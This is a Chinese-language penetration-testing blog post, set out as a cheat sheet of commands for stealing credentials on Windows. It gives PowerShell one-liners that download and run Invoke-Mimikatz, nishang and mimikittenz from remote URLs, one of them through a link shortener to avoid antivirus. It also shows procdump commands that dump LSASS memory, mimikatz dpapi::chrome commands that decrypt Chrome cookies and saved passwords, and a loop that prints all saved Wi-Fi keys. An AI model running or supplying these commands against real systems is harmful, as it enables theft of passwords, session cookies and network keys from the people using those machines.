---
layout:     post
title:       Mimikatz读取chrome浏览器cookies，password
subtitle:   Mimikatz读取密码
date:       2020-06-29
author:     BugMan
header-img: img/post-bg-hacker.jpg
catalog: true
tags:
    - google
    - 渗透测试

---
### 1.2免杀抓取密码的两种方式

```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
tips:powershell 默认windows visa后才有
```

procdump lsass 进程导出技巧
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bits

C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits
然后本地使用mimikatz 还原密码
### mimikatz 读取chrome cookies

```
mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1" exit

mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit //读chrome密码
```
### powershell 常用工具的信息收集工具

FTP访问、共享连接、putty连接 驱动、应用程序、hosts 文件、进程、无线网络记录

```
powershell "IEX (New-Object Net.WebClient).DownloadString(' https://github.com/samratashok/nishang/tree/master/Gather/Gather/Get-Information.ps1'); Get-Information"
```

正则过滤进程密码，已测windows7

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz

sqlserver密码获取工具Get-MSSQLCredentialPasswords.psm1 //未测
```
### 查看wifi密码
```
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```

### 2.3 windows log的信息查看

windows自带的命令就可以

日志查看收集

#### 1、Windows2003下默认存在eventquery.vbs

```
cscript c:\WINDOWS\system32\eventquery.vbs /fi "Datetime eq 06/24/2015,01:00:00AM-06/24/2015,10:00:00AM" /l Security /V #查看SECURITY日志 2015-6.24 上午1点-上午10点日志
```

#### 2 windows 7以上wevtutil 命令

```
wevtutil qe security /rd:true /f:text /q:"*[system/eventid=4624 and 4623 and 4627]" #查询所有登录、注销相关的日志语法
```

#### 3.第三方信息收集工具LogParser.exe psloglist.exe等



